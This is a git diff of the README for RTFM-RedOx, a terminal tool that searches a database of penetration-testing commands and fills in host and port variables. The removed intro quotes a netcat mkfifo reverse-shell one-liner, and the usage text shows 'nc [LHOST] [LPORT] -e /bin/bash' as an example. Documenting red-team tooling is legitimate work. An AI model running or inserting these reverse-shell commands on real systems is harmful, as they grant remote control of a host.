@@ -1,13 +1,14 @@
-RTFM-RedOx is meant to be an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) (inspired by the book, Red Team Field Manual) as well as something that works similarly to [Rev Shells](https://revshells.com/) or the [HackTools](https://addons.mozilla.org/en-US/firefox/addon/hacktools/) browser plugin.  All without the need to leave your terminal to search through notes or open a browser window, or continually run a python script with a lot of switches you'll never remember.  It's basically like having a terminal history and history search for commands you never type in your terminal but often type when you have a shell on a remote host or when interacting with a vulnerable web app.  The database does also contain many commands you'd also run on your local machine for things like nmap, impacket scripts (adding as I go), crackmapexec, and others.
+RTFM-RedOx is meant to be an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) (inspired by the book, Red Team Field Manual) as well as something that works similarly to [RevShells.com](https://revshells.com/).  
 
-In addition to its utility this can also be a great learning resource through the one or more reference links to web content or video material associated with each command.  For example, the following reverse shell one liner has been used by many but is probably not all that well understood.
-```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LHOST] [LPORT] >/tmp/f
-```
-0xdf has a [great video](https://www.youtube.com/watch?v=_q_ZCy-hEqg) that breaks down each part of that command and explains it in detail. I will be updating references for commands in the database that include deep dive explanations, preferrably to video content, that provide a better understanding for more complex commands related to Kerberos, ADCS or Windows authentication in general.  The commands in the database from the original RTFM project do have links to websites and many of those are good but some need updating or additional references to more in depth explanations. 
+## Features
+- A command line interface that includes a quick search for commands and comments within the included database.  Searching on command comments is useful for something like mimikatz, where mimikatz isn't in the actual command syntax itself, but is referenced in the comments.  
+- There is variable replacement similar to msfconsole.  Variables can be added to any command. 
+- It has the ability to update command syntax already in the database as well as add new commands.  
+- Multiple references (typically hyperlinks) can be added to commands for things like cheatsheets, explainer videos, tutorials, whatever.  
 
-I'm currently using the sqlite database that [RTFM](https://github.com/leostat/rtfm) uses but that hasn't been updated in almost 6 years so I will be gradually adding new commands and pushing the edited db file to the repository.    
+The ultimate purpose of this is to eliminate the need to leave the terminal to open a note taking app or web browser to search for command syntax and usage, and to not have to repeatedly type in the same remote/local host ips, ports or urls since those are saved as variables within the CLI and automatically replaced in the command before it is copied to the clipboard.
 
+I'm currently using the sqlite database that [RTFM](https://github.com/leostat/rtfm) uses but that hasn't been updated in almost 6 years so I'm gradually adding new commands and pushing the edited db file to the repository.    
 
 ## Usage
 ```
@@ -19,6 +20,7 @@ Crtl+h or hist   Display selectable history of already selected commands.
 Ctrl+v           Paste from clipboard
 info             Display info on the currently selected command.
 env              Show user variables that have already been set.
+set              Set a user variable e.g. set lhost 10.10.16.3
 add -c           Add a command to the database e.g. 'add -c nc [LHOST] [LPORT] -e /bin/bash'
 update           Update a database column in the selected command
                  e.g. comment, command, author or references
@@ -58,17 +60,14 @@ sudo apt install libxcb1-dev libxcb-render0-dev libxcb-shape0-dev libxcb-xfixes0
 
 
 ## To Add
-- [x] After adding a new command to the db select it as the current command.
 - [X] Search checks against both command and comment field via Ctrl+r toggle search mode
-- [ ] Continue updating database with newer commands for things like Crackmapexec,ffuf,feroxbuster,Rubeus,Impacket, etc.
-- [ ] Update command reference links to better and more up to date content, preferably adding links to video content when possible.
-- [ ] Display ids next to references so that if necessary they can be deleted from the db through the redox CLI.  
-- [ ] Add config file to store user set variables and other as yet to be determined configurations.
-    - This might be the place for related commands that are often used together. Add ability to save the commands in the current history.  Would need a way to quickly delete a command in the current history e.g. highlight the command and then Ctrl+d to remove it. Also need to be able to completely clear the current history.  User would also need to supply a name for the history before it is saved to the config file.  These would be stored as an array of row IDs from TblCommand. Use the 'config' crate to facilitate this.  
-- [ ] Ctrl+d while in selectable list deletes the item from the database, or if in history mode, deletes the item from the current history.
-- [ ] Add a local references option via the soon to be added config file for references to notes on the local filesystem.
+- [ ] Selectable list of tags to retrieve grouped commands
+- [ ] Delete functionality for rows and columns in the database
+    - For example, Ctrl+d while in selectable list deletes the item from the database, or if in history mode, deletes the item from the current history.  Deleting references and tags from a command will be done with 'delete tag <id>' or 'delete reference <id>'.  Ids will be displayed next to tags and references in the info for the command.    
+- [ ] Add config file to persist user set variables and other as yet to be determined configurations.
+    - This might be the place for related commands that are often used together. Add ability to save the commands from the current history.  Would need a way to quickly delete a command in the current history e.g. highlight the command and then Ctrl+d to remove it. Also need to be able to completely clear the current history.  User would also need to supply a name for the history before it is saved to the config file.  These would be stored as an array of row IDs from TblCommand. Use the 'config' crate to facilitate this.  
 - [ ] Left/right arrow keys to edit already typed or pasted in command.  Really only useful when typing a long command to add to or update the database.
-- [ ] Make use of tags already implemented in the database to display selectable list of grouped items. For example, 'reverse shells linux' to display all commands in the database grouped under that tag.  At the moment, tags already in the database are probably a little too general to be useful e.g. 'bash', 'windows'.  Also need a function to display all tags in the database as a selectable list.
+- [ ] Add a local references option via the soon to be added config file for references to notes and scripts on the local filesystem.
 - [ ] Implement [RTFM](https://github.com/leostat/rtfm)'s solution for creating/updating the database
 - [ ] Switch from termion to crossterm for Windows support.
 
